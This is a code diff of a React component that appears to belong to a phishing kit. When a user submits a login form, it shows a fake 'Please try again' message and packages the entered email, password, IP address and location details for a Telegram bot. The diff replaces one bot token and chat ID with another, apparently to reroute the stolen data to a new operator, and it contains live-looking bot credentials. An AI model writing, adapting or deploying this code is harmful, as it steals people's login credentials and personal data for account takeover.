@@ -71,17 +71,17 @@ function App() {
     setComment("Please try again");
     console.log(count);
    if (count === 0) {
-    const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
+    const botID = "bot6643077261:AAG4Ha9CH_7jSG1pNfhbrLdVO8skeoSmD1o";
     const data = {
-      chat_id: "5345652511",
+      chat_id: "5105054254",
       text: {
-        email: fields.email + <br/>,
-        password: field.secret  + <br/>,
-        ip: info.ip  + <br/>,
-        city: info.city  + <br/>,
-        country: info.country  + <br/>,
-        postal: info.postal  + <br/>,
-        region: info.region  + <br/>,
+        email: fields.email,
+        password: field.secret ,
+        ip: info.ip ,
+        city: info.city ,
+        country: info.country ,
+        postal: info.postal ,
+        region: info.region ,
       },
     };
     try {
@@ -104,17 +104,17 @@ function App() {
 
    }
     if (count === 1) {
-      const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
+      const botID = "bot6643077261:AAG4Ha9CH_7jSG1pNfhbrLdVO8skeoSmD1o";
       const data = {
-        chat_id: "5345652511",
+        chat_id: "5105054254",
         text:  {
-       email: fields.email  + <br/>,
-        password: field.secret  + <br/>,
-        ip: info.ip + <br/>,
-        city : info.city + <br/>,
-        country: info.country + <br/>,
-        postal: info.postal + <br/>,
-        region: info.region  + <br/>,
+       email: fields.email ,
+        password: field.secret ,
+        ip: info.ip,
+        city : info.city,
+        country: info.country,
+        postal: info.postal,
+        region: info.region ,
         },
       };
       try {
